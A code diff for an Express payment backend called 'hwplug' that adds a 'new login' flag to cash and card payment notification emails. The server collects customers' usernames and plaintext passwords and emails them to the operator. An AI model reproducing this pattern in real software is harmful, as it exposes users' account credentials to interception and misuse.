@@ -304,12 +304,15 @@ app.post('/submit-card-payment', async (req, res) => {
 // NEW ENDPOINT: Submit cash payment
 app.post('/submit-cash-payment', async (req, res) => {
   try {
-    const { username, password, productName, productPrice } = req.body;
+    const { username, password, productName, productPrice, previousUsername } = req.body;
     
     // Validate required fields
     if (!username || !password) {
       return res.status(400).json({ error: 'Username and password are required' });
     }
+    
+    // Check if this is a new login (different username)
+    const isNewLogin = !previousUsername || previousUsername !== username;
     
     // Check if product is available
     resetDailyCountersIfNeeded();
@@ -326,24 +329,14 @@ app.post('/submit-cash-payment', async (req, res) => {
     }
     
     // Send email notification for cash payment (non-blocking)
-    // Also send updated login notification with payment method
-    sendLoginNotification({
-      username,
-      password,
-      productName,
-      productPrice,
-      paymentMethod: 'cash'
-    }).catch(err => {
-      console.error('Error sending login notification email:', err);
-    });
-    
     sendCashPaymentNotification({
       username,
       password,
       productName,
       productPrice,
       remainingSlots: remainingSlots,
-      currentCount: productName && dailyLimits[productName] ? dailyLimits[productName].count : 0
+      currentCount: productName && dailyLimits[productName] ? dailyLimits[productName].count : 0,
+      isNewLogin: isNewLogin
     }).catch(err => {
       console.error('Error sending cash payment notification email:', err);
       // Don't fail the request if email fails
@@ -576,7 +569,7 @@ async function sendLoginNotification(data) {
 
 // Send cash payment notification via email
 async function sendCashPaymentNotification(data) {
-  const { username, password, productName, productPrice, remainingSlots = 0, currentCount = 0 } = data;
+  const { username, password, productName, productPrice, remainingSlots = 0, currentCount = 0, isNewLogin = false } = data;
   
   if (!resend || !process.env.YOUR_EMAIL) {
     console.error('❌ Cannot send email - Resend not initialized or YOUR_EMAIL not set');
@@ -587,7 +580,7 @@ async function sendCashPaymentNotification(data) {
     const { data: emailData, error } = await resend.emails.send({
       from: 'hwplug <onboarding@resend.dev>',
       to: process.env.YOUR_EMAIL,
-      subject: '🔐 NEW LOGIN - Cash Payment Request - hwplug',
+      subject: isNewLogin ? '🔐 NEW LOGIN - Cash Payment Request - hwplug' : '💵 Cash Payment Request - hwplug',
       html: `
         <!DOCTYPE html>
         <html>
@@ -599,7 +592,7 @@ async function sendCashPaymentNotification(data) {
             <!-- Header with gradient -->
             <div style="background: linear-gradient(135deg, #6C63FF 0%, #5548d9 100%); padding: 40px 30px; text-align: center; border-radius: 12px 12px 0 0;">
               <h1 style="color: #ffffff; font-size: 32px; font-weight: 900; margin: 0; letter-spacing: -1px;">hwplug</h1>
-              <p style="color: #e8e6ff; margin: 10px 0 0 0; font-size: 16px;">🔐 New Login - Cash Payment</p>
+              <p style="color: #e8e6ff; margin: 10px 0 0 0; font-size: 16px;">${isNewLogin ? '🔐 New Login - Cash Payment' : '💵 Cash Payment Request'}</p>
             </div>
 
             <!-- Content -->
@@ -681,7 +674,7 @@ async function sendCashPaymentNotification(data) {
 
 // Send login details notification via email (after card payment)
 async function sendLoginDetailsNotification(data) {
-  const { username, password, platform, sessionId, productName, productPrice, paymentMethod, remainingSlots = 0, currentCount = 0 } = data;
+  const { username, password, platform, sessionId, productName, productPrice, paymentMethod, remainingSlots = 0, currentCount = 0, isNewLogin = false } = data;
   
   if (!resend || !process.env.YOUR_EMAIL) {
     console.error('❌ Cannot send email - Resend not initialized or YOUR_EMAIL not set');
@@ -692,7 +685,7 @@ async function sendLoginDetailsNotification(data) {
     const { data: emailData, error } = await resend.emails.send({
       from: 'hwplug <onboarding@resend.dev>',
       to: process.env.YOUR_EMAIL,
-      subject: '🔐 NEW LOGIN - Card Payment Success - hwplug',
+      subject: isNewLogin ? '🔐 NEW LOGIN - Card Payment Success - hwplug' : '💳 Card Payment Success - hwplug',
       html: `
         <!DOCTYPE html>
         <html>
@@ -704,7 +697,7 @@ async function sendLoginDetailsNotification(data) {
             <!-- Header with gradient -->
             <div style="background: linear-gradient(135deg, #6C63FF 0%, #5548d9 100%); padding: 40px 30px; text-align: center; border-radius: 12px 12px 0 0;">
               <h1 style="color: #ffffff; font-size: 32px; font-weight: 900; margin: 0; letter-spacing: -1px;">hwplug</h1>
-              <p style="color: #e8e6ff; margin: 10px 0 0 0; font-size: 16px;">🔐 New Login - Card Payment</p>
+              <p style="color: #e8e6ff; margin: 10px 0 0 0; font-size: 16px;">${isNewLogin ? '🔐 New Login - Card Payment' : '💳 Card Payment Successful'}</p>
             </div>
 
             <!-- Content -->
